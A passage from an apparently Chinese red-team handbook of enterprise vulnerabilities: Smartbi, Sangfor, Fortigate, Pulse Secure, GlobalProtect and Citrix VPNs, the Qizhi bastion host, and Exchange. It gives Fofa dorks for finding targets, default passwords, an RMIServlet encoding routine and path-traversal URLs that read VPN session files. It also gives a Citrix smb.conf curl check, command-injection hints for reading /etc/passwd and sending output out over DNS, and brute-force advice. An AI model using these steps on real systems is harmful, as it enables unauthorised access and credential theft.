SmartbiException(ConfigErrorCode.DELETE_FAILED, var17);        } <span class="hljs-keyword">finally</span> {            DbUtil.closeDBObject((ResultSet)rs, prep, conn);        }        <span class="hljs-keyword">return</span> succ ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>;    } <span class="hljs-keyword">else</span> {        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    }}</code></pre><p><strong>6. 漏洞利用</strong></p><p>这里是delete 注入, 不建议使用, 没看到有公开的利用信息, 就不写EXP了</p><p><strong>7. 利用技巧</strong></p><p>1.RMIServlet加解密代码</p><p>虽然利用不能写EXP, 这里写一个RMIServlet 的加解密代码</p><pre><code class="hljs cs">ENCODING_SCHEDULE = {    <span class="hljs-string">"0"</span>: <span class="hljs-string">"7"</span>, <span class="hljs-string">"1"</span>: <span class="hljs-string">"1"</span>, <span class="hljs-string">"2"</span>: <span class="hljs-string">"u"</span>, <span class="hljs-string">"3"</span>: <span class="hljs-string">"N"</span>, <span class="hljs-string">"4"</span>: <span class="hljs-string">"K"</span>, <span class="hljs-string">"5"</span>: <span class="hljs-string">"J"</span>, <span class="hljs-string">"6"</span>: <span class="hljs-string">"M"</span>, <span class="hljs-string">"7"</span>: <span class="hljs-string">"9"</span>, <span class="hljs-string">"8"</span>: <span class="hljs-string">"'"</span>, <span class="hljs-string">"9"</span>: <span class="hljs-string">"m"</span>, <span class="hljs-string">"!"</span>: <span class="hljs-string">"P"</span>,     <span class="hljs-string">"%"</span>: <span class="hljs-string">"/"</span>, <span class="hljs-string">"'"</span>: <span class="hljs-string">"n"</span>, <span class="hljs-string">"("</span>: <span class="hljs-string">"A"</span>, <span class="hljs-string">")"</span>: <span class="hljs-string">"E"</span>, <span class="hljs-string">"*"</span>: <span class="hljs-string">"s"</span>, <span class="hljs-string">"+"</span>: <span class="hljs-string">"+"</span>, <span class="hljs-string">"-"</span>: <span class="hljs-string">"f"</span>, <span class="hljs-string">"."</span>: <span class="hljs-string">"q"</span>, <span class="hljs-string">"A"</span>: <span class="hljs-string">"O"</span>, <span class="hljs-string">"B"</span>: <span class="hljs-string">"V"</span>, <span class="hljs-string">"C"</span>: <span class="hljs-string">"t"</span>,     <span class="hljs-string">"D"</span>: <span class="hljs-string">"T"</span>, <span class="hljs-string">"E"</span>: <span class="hljs-string">"a"</span>, <span class="hljs-string">"F"</span>: <span class="hljs-string">"x"</span>, <span class="hljs-string">"G"</span>: <span class="hljs-string">"H"</span>, <span class="hljs-string">"H"</span>: <span class="hljs-string">"r"</span>, <span class="hljs-string">"I"</span>: <span class="hljs-string">"c"</span>, <span class="hljs-string">"J"</span>: <span class="hljs-string">"v"</span>, <span class="hljs-string">"K"</span>: <span class="hljs-string">"l"</span>, <span class="hljs-string">"L"</span>: <span class="hljs-string">"8"</span>, <span class="hljs-string">"M"</span>: <span class="hljs-string">"F"</span>, <span class="hljs-string">"N"</span>: <span class="hljs-string">"3"</span>,     <span class="hljs-string">"O"</span>: <span class="hljs-string">"o"</span>, <span class="hljs-string">"P"</span>: <span class="hljs-string">"L"</span>, <span class="hljs-string">"Q"</span>: <span class="hljs-string">"Y"</span>, <span class="hljs-string">"R"</span>: <span class="hljs-string">"j"</span>, <span class="hljs-string">"S"</span>: <span class="hljs-string">"W"</span>, <span class="hljs-string">"T"</span>: <span class="hljs-string">"*"</span>, <span class="hljs-string">"U"</span>: <span class="hljs-string">"z"</span>, <span class="hljs-string">"V"</span>: <span class="hljs-string">"Z"</span>, <span class="hljs-string">"W"</span>: <span class="hljs-string">"!"</span>, <span class="hljs-string">"X"</span>: <span class="hljs-string">"B"</span>, <span class="hljs-string">"Y"</span>: <span class="hljs-string">")"</span>,     <span class="hljs-string">"Z"</span>: <span class="hljs-string">"U"</span>, <span class="hljs-string">"a"</span>: <span class="hljs-string">"("</span>, <span class="hljs-string">"b"</span>: <span class="hljs-string">"~"</span>, <span class="hljs-string">"c"</span>: <span class="hljs-string">"i"</span>, <span class="hljs-string">"d"</span>: <span class="hljs-string">"h"</span>, <span class="hljs-string">"e"</span>: <span class="hljs-string">"p"</span>, <span class="hljs-string">"f"</span>: <span class="hljs-string">"_"</span>, <span class="hljs-string">"g"</span>: <span class="hljs-string">"-"</span>, <span class="hljs-string">"h"</span>: <span class="hljs-string">"I"</span>, <span class="hljs-string">"i"</span>: <span class="hljs-string">"R"</span>, <span class="hljs-string">"j"</span>: <span class="hljs-string">"."</span>,     <span class="hljs-string">"k"</span>: <span class="hljs-string">"G"</span>, <span class="hljs-string">"l"</span>: <span class="hljs-string">"S"</span>, <span class="hljs-string">"m"</span>: <span class="hljs-string">"d"</span>, <span class="hljs-string">"n"</span>: <span class="hljs-string">"6"</span>, <span class="hljs-string">"o"</span>: <span class="hljs-string">"w"</span>, <span class="hljs-string">"p"</span>: <span class="hljs-string">"5"</span>, <span class="hljs-string">"q"</span>: <span class="hljs-string">"0"</span>, <span class="hljs-string">"r"</span>: <span class="hljs-string">"4"</span>, <span class="hljs-string">"s"</span>: <span class="hljs-string">"D"</span>, <span class="hljs-string">"t"</span>: <span class="hljs-string">"k"</span>, <span class="hljs-string">"u"</span>: <span class="hljs-string">"Q"</span>,     <span class="hljs-string">"v"</span>: <span class="hljs-string">"g"</span>, <span class="hljs-string">"w"</span>: <span class="hljs-string">"b"</span>, <span class="hljs-string">"x"</span>: <span class="hljs-string">"C"</span>, <span class="hljs-string">"y"</span>: <span class="hljs-string">"2"</span>, <span class="hljs-string">"z"</span>: <span class="hljs-string">"X"</span>, <span class="hljs-string">"~"</span>: <span class="hljs-string">"e"</span>, <span class="hljs-string">"_"</span>: <span class="hljs-string">"y"</span>, }DECODING_SCHEDULE = {    <span class="hljs-string">"7"</span>: <span class="hljs-string">"0"</span>, <span class="hljs-string">"1"</span>: <span class="hljs-string">"1"</span>, <span class="hljs-string">"u"</span>: <span class="hljs-string">"2"</span>, <span class="hljs-string">"N"</span>: <span class="hljs-string">"3"</span>, <span class="hljs-string">"K"</span>: <span class="hljs-string">"4"</span>, <span class="hljs-string">"J"</span>: <span class="hljs-string">"5"</span>, <span class="hljs-string">"M"</span>: <span class="hljs-string">"6"</span>, <span class="hljs-string">"9"</span>: <span class="hljs-string">"7"</span>, <span class="hljs-string">"'"</span>: <span class="hljs-string">"8"</span>, <span class="hljs-string">"m"</span>: <span class="hljs-string">"9"</span>, <span class="hljs-string">"P"</span>: <span class="hljs-string">"!"</span>,     <span class="hljs-string">"/"</span>: <span class="hljs-string">"%"</span>, <span class="hljs-string">"n"</span>: <span class="hljs-string">"'"</span>, <span class="hljs-string">"A"</span>: <span class="hljs-string">"("</span>, <span class="hljs-string">"E"</span>: <span class="hljs-string">")"</span>, <span class="hljs-string">"s"</span>: <span class="hljs-string">"*"</span>, <span class="hljs-string">"+"</span>: <span class="hljs-string">"+"</span>, <span class="hljs-string">"f"</span>: <span class="hljs-string">"-"</span>, <span class="hljs-string">"q"</span>: <span class="hljs-string">"."</span>, <span class="hljs-string">"O"</span>: <span class="hljs-string">"A"</span>, <span class="hljs-string">"V"</span>: <span class="hljs-string">"B"</span>, <span class="hljs-string">"t"</span>: <span class="hljs-string">"C"</span>,     <span class="hljs-string">"T"</span>: <span class="hljs-string">"D"</span>, <span class="hljs-string">"a"</span>: <span class="hljs-string">"E"</span>, <span class="hljs-string">"x"</span>: <span class="hljs-string">"F"</span>, <span class="hljs-string">"H"</span>: <span class="hljs-string">"G"</span>, <span class="hljs-string">"r"</span>: <span class="hljs-string">"H"</span>, <span class="hljs-string">"c"</span>: <span class="hljs-string">"I"</span>, <span class="hljs-string">"v"</span>: <span class="hljs-string">"J"</span>, <span class="hljs-string">"l"</span>: <span class="hljs-string">"K"</span>, <span class="hljs-string">"8"</span>: <span class="hljs-string">"L"</span>, <span class="hljs-string">"F"</span>: <span class="hljs-string">"M"</span>, <span class="hljs-string">"3"</span>: <span class="hljs-string">"N"</span>,     <span class="hljs-string">"o"</span>: <span class="hljs-string">"O"</span>, <span class="hljs-string">"L"</span>: <span class="hljs-string">"P"</span>, <span class="hljs-string">"Y"</span>: <span class="hljs-string">"Q"</span>, <span class="hljs-string">"j"</span>: <span class="hljs-string">"R"</span>, <span class="hljs-string">"W"</span>: <span class="hljs-string">"S"</span>, <span class="hljs-string">"*"</span>: <span class="hljs-string">"T"</span>, <span class="hljs-string">"z"</span>: <span class="hljs-string">"U"</span>, <span class="hljs-string">"Z"</span>: <span class="hljs-string">"V"</span>, <span class="hljs-string">"!"</span>: <span class="hljs-string">"W"</span>, <span class="hljs-string">"B"</span>: <span class="hljs-string">"X"</span>, <span class="hljs-string">")"</span>: <span class="hljs-string">"Y"</span>,     <span class="hljs-string">"U"</span>: <span class="hljs-string">"Z"</span>, <span class="hljs-string">"("</span>: <span class="hljs-string">"a"</span>, <span class="hljs-string">"~"</span>: <span class="hljs-string">"b"</span>, <span class="hljs-string">"i"</span>: <span class="hljs-string">"c"</span>, <span class="hljs-string">"h"</span>: <span class="hljs-string">"d"</span>, <span class="hljs-string">"p"</span>: <span class="hljs-string">"e"</span>, <span class="hljs-string">"_"</span>: <span class="hljs-string">"f"</span>, <span class="hljs-string">"-"</span>: <span class="hljs-string">"g"</span>, <span class="hljs-string">"I"</span>: <span class="hljs-string">"h"</span>, <span class="hljs-string">"R"</span>: <span class="hljs-string">"i"</span>, <span class="hljs-string">"."</span>: <span class="hljs-string">"j"</span>,     <span class="hljs-string">"G"</span>: <span class="hljs-string">"k"</span>, <span class="hljs-string">"S"</span>: <span class="hljs-string">"l"</span>, <span class="hljs-string">"d"</span>: <span class="hljs-string">"m"</span>, <span class="hljs-string">"6"</span>: <span class="hljs-string">"n"</span>, <span class="hljs-string">"w"</span>: <span class="hljs-string">"o"</span>, <span class="hljs-string">"5"</span>: <span class="hljs-string">"p"</span>, <span class="hljs-string">"0"</span>: <span class="hljs-string">"q"</span>, <span class="hljs-string">"4"</span>: <span class="hljs-string">"r"</span>, <span class="hljs-string">"D"</span>: <span class="hljs-string">"s"</span>, <span class="hljs-string">"k"</span>: <span class="hljs-string">"t"</span>, <span class="hljs-string">"Q"</span>: <span class="hljs-string">"u"</span>,     <span class="hljs-string">"g"</span>: <span class="hljs-string">"v"</span>, <span class="hljs-string">"b"</span>: <span class="hljs-string">"w"</span>, <span class="hljs-string">"C"</span>: <span class="hljs-string">"x"</span>, <span class="hljs-string">"2"</span>: <span class="hljs-string">"y"</span>, <span class="hljs-string">"X"</span>: <span class="hljs-string">"z"</span>, <span class="hljs-string">"e"</span>: <span class="hljs-string">"~"</span>, <span class="hljs-string">"y"</span>: <span class="hljs-string">"_"</span>, }<span class="hljs-meta">#此函数可以用来加密明文也可以解密服务器返回的密文</span><span class="hljs-function">def <span class="hljs-title">encode</span>(<span class="hljs-params">code</span>):</span><span class="hljs-function">    <span class="hljs-keyword">out</span></span> = <span class="hljs-string">""</span>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> code:        <span class="hljs-keyword">out</span> = <span class="hljs-keyword">out</span> + ENCODING_SCHEDULE.<span class="hljs-keyword">get</span>(item, item)    <span class="hljs-keyword">return</span> <span class="hljs-keyword">out</span><span class="hljs-function">def <span class="hljs-title">decode</span>(<span class="hljs-params">code</span>):</span><span class="hljs-function">    <span class="hljs-keyword">out</span></span> = <span class="hljs-string">""</span>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> code:        <span class="hljs-keyword">out</span> = <span class="hljs-keyword">out</span> + DECODING_SCHEDULE.<span class="hljs-keyword">get</span>(item, item)    <span class="hljs-keyword">return</span> <span class="hljs-keyword">out</span></code></pre><p>2.该系统还有几处漏洞, 比如默认口令</p><pre><code class="hljs nsis">demo/demomanager/demo<span class="hljs-literal">admin</span>/<span class="hljs-literal">admin</span><span class="hljs-literal">admin</span>/manager<span class="hljs-literal">admin</span>/<span class="hljs-number">2</span>manager</code></pre><p>3.默认路径</p><pre><code class="hljs ruby"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/127.0.0.1:18080/smartbi</span><span class="hljs-regexp">/vision/config</span>.jsp<span class="hljs-string">` 可能未修改密码或者密码为`</span>manager</code></pre><p>4.进入后台目录遍历</p><pre><code class="hljs xquery">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">18080</span>/smartbi/vision/chooser.jsp<span class="hljs-built_in">?key</span>=CONFIG_FILE_DIR<span class="hljs-built_in">&amp;root</span>=C<span class="hljs-meta">%3A</span><span class="hljs-meta">%2F</span></code></pre><p>同样是后台可以加载插件, 怎么getshell不用我多说了吧</p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.使用强口令</p><p>3.版本最好为最新版8.5以上, v7还有其他漏洞</p><h2 id="深信服VPN远程代码执行"><a href="#深信服VPN远程代码执行" class="headerlink" title="深信服VPN远程代码执行"></a>深信服VPN远程代码执行</h2><p><strong>1. 漏洞简介</strong></p><p>深信服 VPN 某个特定产品存在远程代码执行, 2019 攻防演练使用过</p><p><strong>2. 影响组件</strong><br>深信服 VPN</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs delphi"><span class="hljs-keyword">Set</span>-Cookie: TWFID=welcome <span class="hljs-keyword">to</span> ssl vpnSinfor</code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">header</span>=<span class="hljs-string">"Set-Cookie: TWFID="</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>深信服vpnweb登录逆向学习 – potatso – 博客园<br><a href="https://www.cnblogs.com/potatsoSec/p/12326356.html" target="_blank" rel="noopener">https://www.cnblogs.com/potatsoSec/p/12326356.html</a></p><p><strong>6. 漏洞利用</strong></p><pre><code class="hljs cos">wget -t <span class="hljs-built_in">%d</span> -T <span class="hljs-built_in">%d</span> --spider <span class="hljs-built_in">%s</span>分析一下上面文章就ok, 比较简单的命令注入</code></pre><p><strong>7. 利用技巧</strong></p><p>1.该版本深信服VPN属于相对早期的版本, 大概2008年左右, 但目前还有761个ip开放在公网</p><p>2.该版本较低, <code>whomai</code>不存在, 可以使用 <code>uname</code>, 这里没有空格可dns传出来</p><p>3.去除空格也简单 <code>cat /etc/passwd | tr " \n" "+|"</code></p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.升级到最新版</p><h2 id="深信服-VPN-口令爆破"><a href="#深信服-VPN-口令爆破" class="headerlink" title="深信服 VPN 口令爆破"></a>深信服 VPN 口令爆破</h2><p><strong>1. 漏洞简介</strong></p><p>深信服 VPN 针对口令爆破是5次错误锁定IP五分钟, 所以这里爆破也不是不行, 主要是测试常见弱口令以及分布式爆破也不是不行</p><p><strong>2. 影响组件</strong><br>深信服 VPN</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs awk"><span class="hljs-regexp">/por/</span>login_auth.csp?apiversion=<span class="hljs-number">1</span>sangfor<span class="hljs-regexp">/cgi-bin/</span>login.cgi?rnd=</code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"深信服-SSL-VPN"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>关于SSL VPN认证时的验证码绕过 – SSL VPN/EMM – 深信服社区<br><a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=20633" target="_blank" rel="noopener">https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=20633</a></p><p>此处存疑, 时间问题没有测试</p><p><strong>6. 漏洞利用</strong></p><p>1.深信服VPN 口令爆破 demo (这里仅测试了M6,其他的应该差不多)</p><pre><code class="hljs python"><span class="hljs-comment">#encoding=utf8</span><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> urllib3urllib3.disable_warnings()<span class="hljs-keyword">import</span> resession = requests.session()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">SanForLogin</span><span class="hljs-params">(target, password, username=<span class="hljs-string">"admin"</span>)</span>:</span>    <span class="hljs-comment"># 加密密码的算法是 sha1(password+sid)</span>    <span class="hljs-comment"># 没有公开POC就不写了</span>SanForLogin(<span class="hljs-string">"https://xxxxxxxxxxx/"</span>, <span class="hljs-string">"admin"</span>)</code></pre><p><strong>7. 利用技巧</strong></p><p>1.由于深信服涉及的版本跨度时间达十几年, 很多地方不一样, 但是总体都差不太多</p><p>国外APT组织应该也批量爆破了一波</p><p>加密的密码也就是 <code>sha1(password+sid)</code></p><p>爆破也就锁一会ip, 夜里丢一边跑着就完事了, 弱口令也就那么些</p><pre><code class="hljs angelscript">admin/<span class="hljs-number">123456</span>/Sangfor/<span class="hljs-symbol">Sangfor@</span><span class="hljs-number">123</span></code></pre><p>2.如果爆破出来了管理员密码, 管理员后台有好多处命令注入, 比如升级工具, 这里讲起来应该是正常功能</p><p>3.去年传闻还有前台sql注入, 但是没拿到补丁, 手头没环境, 就没分析, 看一下乌云上的老洞吧</p><p>深信服SSL VPN外置数据中心敏感信息泄漏&amp;SQL注入漏洞可导致getshell – 体验盒子 – 关注网络安全<br><a href="https://www.uedbox.com/post/31092/" target="_blank" rel="noopener">https://www.uedbox.com/post/31092/</a></p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.升级到最新版</p><h2 id="Fortigate-SSL-VPN-文件读取-远程代码执行"><a href="#Fortigate-SSL-VPN-文件读取-远程代码执行" class="headerlink" title="Fortigate SSL VPN 文件读取/远程代码执行"></a>Fortigate SSL VPN 文件读取/远程代码执行</h2><p><strong>1. 漏洞简介</strong></p><p>Fortigate SSL VPN 在全球用户量巨大, 去年橘子哥发现了文件读取和远程代码执行漏洞</p><p><strong>2. 影响组件</strong><br>Fortigate SSL VPN</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs angelscript">Fortigate<span class="hljs-number">4</span>tinet2095866</code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs routeros"><span class="hljs-string">"Fortigate"</span> &amp;&amp; <span class="hljs-attribute">port</span>=10443</code></pre><p><strong>5. 漏洞分析</strong></p><p>Orange: Attacking SSL VPN – Part 2: Breaking the Fortigate SSL VPN<br><a href="https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html?m=1" target="_blank" rel="noopener">https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html?m=1</a></p><p><strong>6. 漏洞利用</strong></p><p>密码读取</p><p>milo2012/CVE-2018-13379: CVE-2018-13379<br><a href="https://github.com/milo2012/CVE-2018-13379" target="_blank" rel="noopener">https://github.com/milo2012/CVE-2018-13379</a></p><p>任意密码重置, 这肯定是个后门</p><p>milo2012/CVE-2018-13382: CVE-2018-13382<br><a href="https://github.com/milo2012/CVE-2018-13382" target="_blank" rel="noopener">https://github.com/milo2012/CVE-2018-13382</a></p><p><strong>7. 利用技巧</strong></p><p>1.文件读取的路径构造</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xxxxxx:<span class="hljs-number">10443</span><span class="hljs-regexp">/remote/</span>fgt_lang?lang=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span>dev<span class="hljs-regexp">/cmdb/</span>sslvpn_websession</code></pre><p>如下padding可以构造出来任意文件读取, 可以读取其他文件, 注意这个系统好像没有/etc/passwd</p><pre><code class="hljs lisp">print(<span class="hljs-string">"/../../../../"</span>+(<span class="hljs-name">raw_input</span>().rjust(<span class="hljs-number">35</span>, '/')))</code></pre><p>2.寻找魔术数字</p><p>虽然当时橘子哥没有公开魔术数字, 但是当时随手分析了一下下面这个启动文件, 搜索一下magic就找到 4tinet2095866,</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xxxxxxxx:<span class="hljs-number">10443</span><span class="hljs-regexp">/remote/</span>fgt_lang?lang=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/bin/</span>sslvpnd</code></pre><p>后来发现这个字符串在js里面也有, 直接从前台分析也可以获得</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xxxxx:<span class="hljs-number">10443</span><span class="hljs-regexp">/sslvpn/</span>js<span class="hljs-regexp">/login.js?q=5f9a6877fd1f78da768239aae6e739c2</span></code></pre><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.升级到最新版</p><h2 id="Pulse-Secure-SSL-VPN远程代码执行漏洞"><a href="#Pulse-Secure-SSL-VPN远程代码执行漏洞" class="headerlink" title="Pulse Secure SSL VPN远程代码执行漏洞"></a>Pulse Secure SSL VPN远程代码执行漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Pulse Secure SSL VPN 在全球用户量巨大, 去年橘子哥发现了很多漏洞</p><p><strong>2. 影响组件</strong></p><p>Pulse Secure SSL VPN</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs ebnf"><span class="hljs-attribute">Pulse Secure SSL VPN</span></code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"PulseSecure-SSL-VPN"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>Pulse Secure SSL VPN远程代码执行漏洞利用与分析 – 安全客, 安全资讯平台<br><a href="https://www.anquanke.com/post/id/185773" target="_blank" rel="noopener">https://www.anquanke.com/post/id/185773</a></p><p><strong>6. 漏洞利用</strong></p><p>projectzeroindia/CVE-2019-11510: Exploit for Arbitrary File Read on Pulse Secure SSL VPN (CVE-2019-11510)<br><a href="https://github.com/projectzeroindia/CVE-2019-11510" target="_blank" rel="noopener">https://github.com/projectzeroindia/CVE-2019-11510</a></p><p>0xDezzy/CVE-2019-11539: Exploit for the Post-Auth RCE vulnerability in Pulse Secure Connect<br><a href="https://github.com/0xDezzy/CVE-2019-11539" target="_blank" rel="noopener">https://github.com/0xDezzy/CVE-2019-11539</a></p><p><strong>7. 利用技巧</strong></p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.升级到最新版</p><h2 id="Palo-Alto-GlobalProtect-VPN远程代码执行漏洞"><a href="#Palo-Alto-GlobalProtect-VPN远程代码执行漏洞" class="headerlink" title="Palo Alto GlobalProtect VPN远程代码执行漏洞"></a>Palo Alto GlobalProtect VPN远程代码执行漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Palo Alto GlobalProtect 在全球用户量巨大, 去年橘子哥发现了很多漏洞</p><p><strong>2. 影响组件</strong><br>Palo Alto GlobalProtect</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs arcade">GlobalProtect <span class="hljs-built_in">Portal</span></code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"PaloAlto-GlobalProtect"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>Orange: Attacking SSL VPN – Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!<br><a href="https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html" target="_blank" rel="noopener">https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html</a></p><p>Palo Alto GlobalProtect上的PreAuth RCE – 渗透测试中心 – 博客园<br><a href="https://www.cnblogs.com/backlion/p/11209054.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/11209054.html</a></p><p><strong>6. 漏洞利用</strong></p><p>securifera/CVE-2019-1579<br><a href="https://github.com/securifera/CVE-2019-1579" target="_blank" rel="noopener">https://github.com/securifera/CVE-2019-1579</a></p><p><strong>7. 利用技巧</strong></p><p>1.这个扫描的话可以判断</p><pre><code class="hljs awk"><span class="hljs-regexp">/global-protect/</span>portal<span class="hljs-regexp">/css/</span>login.css``<span class="hljs-regexp">/images/</span>logo_pan_158.gif</code></pre><p><code>Last-Modified</code> 是否早于于2018年</p><pre><code class="hljs angelscript">curl -s -I https:<span class="hljs-comment">//sslvpn/global-protect/portal/css/login.css | grep Last-Modified</span>Last-Modified: Sun, <span class="hljs-number">10</span> Sep <span class="hljs-number">2017</span> <span class="hljs-number">16</span>:<span class="hljs-number">48</span>:<span class="hljs-number">23</span> GMT</code></pre><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.升级到最新版</p><h2 id="Citrix-Gateway-ADC-远程代码执行漏洞-CVE-2019-19781"><a href="#Citrix-Gateway-ADC-远程代码执行漏洞-CVE-2019-19781" class="headerlink" title="Citrix Gateway/ADC 远程代码执行漏洞 (CVE-2019-19781)"></a>Citrix Gateway/ADC 远程代码执行漏洞 (CVE-2019-19781)</h2><p><strong>1. 漏洞简介</strong></p><p>Citrix Gateway/ADC 在全球拥有很多的大客户. 这也是个很经典的灯下黑漏洞(后门)</p><p><strong>2. 影响组件</strong></p><p>Citrix Gateway/ADC</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs avrasm">Citrix Gateway/<span class="hljs-keyword">ADC</span></code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Citrix-Netscaler"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>Citrix Gateway/ADC 远程代码执行漏洞分析 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/news/232752.html" target="_blank" rel="noopener">https://www.freebuf.com/news/232752.html</a></p><p><strong>6. 漏洞利用</strong></p><p>trustedsec/cve-2019-19781: This is a tool published for the Citrix ADC (NetScaler) vulnerability. We are only disclosing this due to others publishing the exploit code first.<br><a href="https://github.com/trustedsec/cve-2019-19781" target="_blank" rel="noopener">https://github.com/trustedsec/cve-2019-19781</a></p><p><strong>7. 利用技巧</strong></p><p>1.通过以下命令可以快速断定</p><pre><code class="hljs crystal">curl <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/host/vpn</span><span class="hljs-regexp">/../vpns</span><span class="hljs-regexp">/cfg/smb</span>.conf --path-<span class="hljs-keyword">as</span>-is --insecure</code></pre><p>这里部分版本不需要进行<code>../</code>跳转也可以, 具体原因没有分析</p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.升级到最新版</p><p>3.暂时屏蔽未授权用户对/vpns/路径的访问</p><h2 id="齐治堡垒机相关漏洞"><a href="#齐治堡垒机相关漏洞" class="headerlink" title="齐治堡垒机相关漏洞"></a>齐治堡垒机相关漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>齐治堡垒机是国内使用比较多的堡垒机产品, 后端使用PHP编写</p><p><strong>2. 影响组件</strong><br>齐治堡垒机</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs ebnf"><span class="hljs-attribute">shterm</span></code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"shterm-堡垒机"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>审计某系统从解密到GetShell – 云+社区 – 腾讯云<br><a href="https://cloud.tencent.com/developer/article/1448700" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1448700</a></p><p>齐治堡垒机远程命令执行漏洞（CNVD-2019-20835）分析 – 开发笔记<br><a href="http://kfbiji.com/article/65b98114903248eb" target="_blank" rel="noopener">http://kfbiji.com/article/65b98114903248eb</a></p><p><strong>6. 漏洞利用</strong></p><p>齐治堡垒机远程命令执行漏洞（CNVD-2019-20835）分析 – 开发笔记<br><a href="http://kfbiji.com/article/65b98114903248eb" target="_blank" rel="noopener">http://kfbiji.com/article/65b98114903248eb</a></p><p><strong>7. 利用技巧</strong></p><p>1.齐治堡垒机默认口令:<code>shterm/shterm</code></p><p>2.普通用户获取堡垒机权限, 登录之后可尝试命令注入</p><p>如果有类似chrome的应用可以直接使用<code>ctrl+o</code>打开窗口, 然后新建bat, 起一个cmd或者其他的程序</p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.升级到最新版</p><p>3.做好权限控制</p><h2 id="Exchange-相关漏洞"><a href="#Exchange-相关漏洞" class="headerlink" title="Exchange 相关漏洞"></a>Exchange 相关漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Exchange 是企业用量很大的邮件服务器, 包括一个登录后用户伪造(CVE-2018-8581, 利用难度高)和登录后反序列化漏洞(CVE-2020-0688, 利用难度低)</p><p><strong>2. 影响组件</strong><br>Exchange</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs ebnf"><span class="hljs-attribute">Exchange</span><span class="hljs-attribute">outlook</span></code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Microsoft-Exchange"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>微软Exchange爆出0day漏洞, 来看POC和技术细节 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/195162.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/195162.html</a></p><p>Microsoft Exchange 任意用户伪造漏洞（CVE-2018-8581）分析<br><a href="https://paper.seebug.org/804/" target="_blank" rel="noopener">https://paper.seebug.org/804/</a></p><p>微软Exchange服务器远程代码执行漏洞复现分析[CVE-2020-0688] – 先知社区<br><a href="https://xz.aliyun.com/t/7299" target="_blank" 